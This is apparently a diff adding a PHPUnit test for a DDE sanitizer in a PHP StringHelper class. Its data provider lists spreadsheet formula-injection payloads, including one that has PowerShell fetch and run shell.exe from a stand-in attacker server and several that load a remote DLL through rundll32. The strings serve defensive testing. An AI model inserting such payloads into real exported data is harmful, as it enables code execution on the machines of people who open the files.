@@ -28,4 +28,30 @@ class StringHelperTest extends TestCase
         self::assertEquals(10, mb_strlen(StringHelper::ensureMaxLength('까깨꺄꺠꺼께껴꼐꼬꽈sssss', 10)));
         self::assertEquals(10, mb_strlen(StringHelper::ensureMaxLength('까깨꺄꺠꺼께껴꼐꼬꽈꼬꽈', 10)));
     }
+
+    public function getDdeAttackStrings()
+    {
+        yield ['DDE ("cmd";"/C calc";"!A0")A0'];
+        yield ["@SUM(1+9)*cmd|' /C calc'!A0"];
+        yield ["-10+20+cmd|' /C calc'!A0"];
+        yield ["+10+20+cmd|' /C calc'!A0"];
+        yield ["=10+20+cmd|' /C calc'!A0"];
+        yield ["=cmd|' /C notepad'!'A1'"];
+        yield ["=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0"];
+        yield ["=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
+        yield ["	=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
+        yield ["\t=10+20+cmd|' /C calc'!A0"];
+        yield ["\r=10+20+cmd|' /C calc'!A0"];
+        yield ["\n=10+20+cmd|' /C calc'!A0"];
+        yield ["\r\n=10+20+cmd|' /C calc'!A0"];
+        yield [PHP_EOL . "=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
+    }
+
+    /**
+     * @dataProvider getDdeAttackStrings
+     */
+    public function testSanitizeDde(string $input)
+    {
+        self::assertEquals("' " . $input, StringHelper::sanitizeDDE($input));
+    }
 }
